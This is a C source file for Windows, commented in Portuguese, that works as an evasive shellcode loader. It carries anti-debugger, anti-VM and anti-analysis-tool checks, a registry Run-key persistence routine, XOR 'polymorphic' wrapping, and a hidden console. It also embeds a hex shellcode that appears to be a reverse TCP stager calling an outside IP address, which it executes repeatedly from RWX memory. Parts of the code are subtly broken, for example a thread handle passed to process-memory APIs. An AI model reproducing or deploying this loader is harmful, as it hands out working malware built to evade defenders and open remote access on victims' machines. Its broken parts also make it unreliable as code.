#include "pch.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <Windows.h>
#include <TlHelp32.h>

#ifndef _DEBUG
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#endif

void adicionar_entrada_registro(const wchar_t* nome_chave, const wchar_t* valor) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, nome_chave, 0, REG_SZ, (BYTE*)valor, wcslen(valor) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

char gerar_chave() {
    return (char)(rand() % 256);
}

BOOL detectar_debuggers() {
    return IsDebuggerPresent();
}

BOOL detectar_maq_virtual() {
    char acpi_signature_vbox[] = "VBOX";
    char acpi_signature_vmware[] = "VMW";
    char acpi_signature_hyper_v[] = "HYP";

    BYTE acpi_table[4096];
    DWORD table_size = GetSystemFirmwareTable('ACPI', 0, acpi_table, sizeof(acpi_table));
    if (table_size == 0)
        return FALSE;

    BOOL virtual_machine = FALSE;
    for (int i = 0; i < table_size - sizeof(acpi_signature_vbox); ++i) {
        if (memcmp(acpi_table + i, acpi_signature_vbox, sizeof(acpi_signature_vbox)) == 0 ||
            memcmp(acpi_table + i, acpi_signature_vmware, sizeof(acpi_signature_vmware)) == 0 ||
            memcmp(acpi_table + i, acpi_signature_hyper_v, sizeof(acpi_signature_hyper_v)) == 0) {
            virtual_machine = TRUE;
            break;
        }
    }

    return virtual_machine;
}

BOOL detectar_ferramentas_analise() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    BOOL bProcessFound = FALSE;

    if (Process32FirstW(hSnap, &pe32)) {
        do {
            if (wcscmp(pe32.szExeFile, L"procexp.exe") == 0 ||
                wcscmp(pe32.szExeFile, L"procmon.exe") == 0 ||
                wcscmp(pe32.szExeFile, L"ProcessHacker.exe") == 0) {
                bProcessFound = TRUE;
                break;
            }
        } while (Process32NextW(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return bProcessFound;
}

char* criptografar_string(const char* hex, char chave) {
    size_t len = strlen(hex);
    char* criptografada = (char*)malloc(len + 1);
    for (size_t i = 0; i < len; ++i)
        criptografada[i] = hex[i] ^ chave;
    criptografada[len] = '\0';
    return criptografada;
}

unsigned char* hex_to_string(const char* hex) {
    size_t len = strlen(hex) / 2;
    unsigned char* str = (unsigned char*)malloc(len);
    for (size_t i = 0; i < len; ++i)
        sscanf(hex + 2 * i, "%2hhx", &str[i]);
    return str;
}

void substituir_funcao_thread(const char* shellcode_hex) {
    HANDLE hThread = GetCurrentThread();

    if (hThread == NULL) {
        return;
    }

    char chave = gerar_chave();
    char* shellcode_criptografado = criptografar_string(shellcode_hex, chave);
    unsigned char* shellcode = hex_to_string(shellcode_criptografado);
    size_t shellcode_len = strlen(shellcode_hex) / 2;

    LPVOID allocated_mem = VirtualAllocEx(hThread, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (allocated_mem == NULL) {
        CloseHandle(hThread);
        return;
    }

    if (!WriteProcessMemory(hThread, allocated_mem, shellcode, shellcode_len, NULL)) {
        CloseHandle(hThread);
        return;
    }

    if (QueueUserAPC((PAPCFUNC)allocated_mem, hThread, NULL) == 0) {
        CloseHandle(hThread);
    }

    CloseHandle(hThread);
    free(shellcode_criptografado);
}

char* descriptografar_string(const char* hex, char chave) {
    return criptografar_string(hex, chave);
}

void gerar_shellcode_polimorfico(const char* shellcode_hex) {
    if (detectar_debuggers() || detectar_maq_virtual() || detectar_ferramentas_analise()) {
        return;
    }

    // Adicionada uma pausa aleatória antes da execução para dificultar a detecção por análise temporal
    Sleep(rand() % 1000);

    while (1) {
        char chave = gerar_chave();
        const char* nopsled_hex = "909090909090909090909090909090909090909090909090909090909090";
        char* nopsled_criptografado = criptografar_string(nopsled_hex, chave);
        char* nopsled_descriptografado = descriptografar_string(nopsled_criptografado, chave);
        unsigned char* nopsled = hex_to_string(nopsled_descriptografado);
        char* shellcode_criptografado = criptografar_string(shellcode_hex, chave);
        char* shellcode_descriptografado = descriptografar_string(shellcode_criptografado, chave);
        unsigned char* shellcode = hex_to_string(shellcode_descriptografado);

        size_t nopsled_len = strlen(nopsled_hex) / 2;
        size_t shellcode_len = strlen(shellcode_hex) / 2;
        size_t total_len = nopsled_len + shellcode_len;

        LPVOID allocated_mem = VirtualAlloc(NULL, total_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (allocated_mem == NULL) {
            return;
        }

        memcpy(allocated_mem, nopsled, nopsled_len);
        memcpy((unsigned char*)allocated_mem + nopsled_len, shellcode, shellcode_len);

        ((void(*)())allocated_mem)();

        // Adicionado um intervalo de tempo aleatório entre as execuções para dificultar a análise por frequência
        Sleep(rand() % 2000);

        free(nopsled_criptografado);
        free(nopsled_descriptografado);
        free(shellcode_criptografado);
        free(shellcode_descriptografado);
    }
}

int main() {
    const wchar_t* nome_chave = L"System";
    wchar_t valor[MAX_PATH];
    GetModuleFileNameW(NULL, valor, MAX_PATH);
    //adicionar_entrada_registro(nome_chave, valor);

    const char* shellcode_hex = "fc4883e4f0e8cc00000041514150524831d2515665488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d0508b4818448b40204901d0e3564d31c948ffc9418b34884801d64831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b048841584801d041585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc020037a6038627dc41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e81f0100004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8000f8e6d0000004883c4205e89f681f6a005a2d34c8d9e000100006a404159680010000041584889f24831c941ba58a453e5ffd5488d98000100004989df5356504d31c94989f04889da4889f941ba02d9c85fffd54883c42083f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee920ffffff4801c34829c675b34989fe5f5941594156e810000000342a687ea2d05360c953107acbe83e085e4831c04989f8aafec075fb4831db41021c004889c280e20f021c16418a14004186141841881400fec075e34831dbfec041021c00418a1400418614184188140041021418418a141041301149ffc148ffc975db5f41ffe7586a005949c7c2f0b5a256ffd5"; // Seu shellcode aqui
    srand((unsigned int)time(NULL));
    gerar_shellcode_polimorfico(shellcode_hex);

    return 0;
}
